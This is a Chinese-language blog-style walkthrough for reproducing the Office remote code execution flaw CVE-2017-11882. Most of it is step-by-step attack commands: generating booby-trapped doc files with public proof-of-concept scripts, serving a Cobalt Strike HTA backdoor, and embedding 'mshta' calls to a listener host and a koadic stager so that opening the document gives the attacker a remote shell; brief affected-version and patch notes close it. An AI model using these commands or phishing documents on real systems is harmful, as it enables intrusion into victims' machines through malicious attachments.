### 0x01前言
最近这段时间CVE-2017-11882挺火的。关于这个漏洞详情分析可以查看:[隐藏17年的Office远程代码执行漏洞POC样本分析（CVE-2017-11882）](http://www.freebuf.com/vuls/154462.html)
今天在twitter上看到有人共享了一个POC，[twitter地址](https://twitter.com/gossithedog/status/932694287480913920)，[poc地址](http://owned.lab6.com/~gossi/research/public/cve-2017-11882/)，后来又看到有人共享了一个项目[CVE-2017-11882](https://github.com/embedi/CVE-2017-11882)，简单看了一下这个项目，通过对rtf文件的修改来实现命令执行的目的，但是有个缺陷就是，这个项目使用的是使用webdav的方式来执行远程文件的，但是在执行命令限制在43字节内。
### 0x02漏洞复现
#### 一、简单测试弹出cmd窗口
1.kali下执行生成一个新的doc:
    root@backlion:/opt/CVE-2017-11882-master#git clone https://github.com/embedi/CVE-2017-11882.git
    root@backlion:/opt# pythonwebdav_exec_CVE-2017-11882.py  -u"cmd.exe"  -e  "cmd.exe"  -o  bk.doc
2.在目标测试机上打开，就会弹出计算器：
#### 二、通过cobaltstrike漏洞复现
1.由于有长度的限制，我们需要对poc进行修改，可以使用Evi1cg 师傅改造的poc,其下载地址为：
2.通过cobaltstrike生成一个hta后门：
最终生成一个evil.hta后门文件。
2.使用SimpleHTTPServer搭建一个简单的http服务器，以提供hta后门文件下载执行。
    root@backlion:~/桌面# python -m SimpleHTTPServer  80
3.通过poc生成一个钓鱼的doc文件：
    root@backlion:/opt/CVE-2017-11882-master#python Command_CVE-2017-11882.py  -c  "mshtahttp://10.0.0.101/evil.hta"  -otest.doc
4.将生成的test.doc拷贝到目标靶机上执行，最后CS下可以看到已获得目标shell:
#### 三、通过koadic漏洞复现
1.下载并执行koadic
    root@backlion:/opt# git clonehttps://github.com/backlion/koadic.git
    root@backlion:/opt/koadic# ./koadic
2.分别设置监听地址和端口，并执行：
    (koadic: stager/js/mshta)# set lhost10.0.0.101
    (koadic: stager/js/mshta)# set lport 55555
    (koadic: stager/js/mshta)# run
3.通过poc执行生成一个钓鱼doc文件：
    root@backlion:/opt/CVE-2017-11882-master#python Command_CVE-2017-11882.py  -c"mshta http://10.0.0.101:55555/8VWBT" -o  test.doc
4.将doc拷贝到目标靶机上执行，最终会在koadic:获得目标靶机shell:
(koadic: stager/js/mshta)# zombies 0
### 0x03漏洞影响
Office 365
Microsoft Office 2000
Microsoft Office 2003
Microsoft Office 2007 Service Pack 3
Microsoft Office 2010 Service Pack 2
Microsoft Office 2013 Service Pack 1
Microsoft Office 2016
### 0x04漏洞修复建议
微软已经对此漏洞做出了修复：
(1)下载
 更新补丁进行修补
(2)开启Windows Update功能，定期对系统进行自动更新